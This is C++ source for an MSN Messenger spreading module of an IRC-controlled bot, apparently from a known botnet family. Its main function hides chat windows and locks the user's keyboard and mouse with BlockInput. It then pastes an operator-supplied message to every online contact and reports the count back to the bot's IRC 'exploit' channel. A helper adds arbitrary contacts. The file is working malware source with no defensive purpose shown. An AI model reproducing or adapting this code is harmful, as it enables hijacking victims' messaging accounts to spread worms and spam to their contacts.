#include "../h/includes.h"
#include "../h/functions.h"

#import "../lib/MSNMessengerAPI.tlb" named_guids, no_namespace

void to_variant(BSTR, VARIANT& vt);
int trx;
int stats_msg;

char *stristr(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {

		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;

			if (slen < plen)
				return (NULL);
		}

		sptr = start;
		pptr = (char *) Pattern;

		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;

			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}

void contactfuck(char *contact) 
{ 
	IMSNMessenger *pIMessenger; 
	CoInitialize(0); 
	HRESULT hr = CoCreateInstance( 
		CLSID_Messenger, 
		NULL, 
		CLSCTX_ALL, 
		IID_IMSNMessenger, 
		(void **)&pIMessenger); 
	
	if (SUCCEEDED(hr)) 
	{ 
		pIMessenger->AddContact(0, contact); 
		keybd_event(VK_RETURN, 0, 0, 0);
	} 
	pIMessenger->Release(); 
	CoUninitialize(); 
} 

void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}

DWORD WINAPI ImMsg(LPVOID param)
{
	trx = 0;

	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn.conn;

	IMSNMessenger3 *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);

	char msnmsg[512];
	char msnmsg1[1024];
	strncpy(msnmsg,msn.data1,sizeof(msnmsg));
     
	if (SUCCEEDED(hr))
	{

		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{

			IMSNMessengerContacts *pIMessengerContacts = NULL;
			
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(msnmsg1, msnmsg);
								Sleep(5000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										trx++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
										stats_msg++;
                                        key_type((char *)msnmsg1, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);																
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					if ( trx > 1 )
					{
					irc->pmsg(sinfo[curserver].exploitchan,str_msn_msg, trx);
					}
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}
    IMSNMessengerWindow::Close;
	CoUninitialize();
	clearthread(msn.threadnum);
	ExitThread(0);
	return 0;
}

void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
}
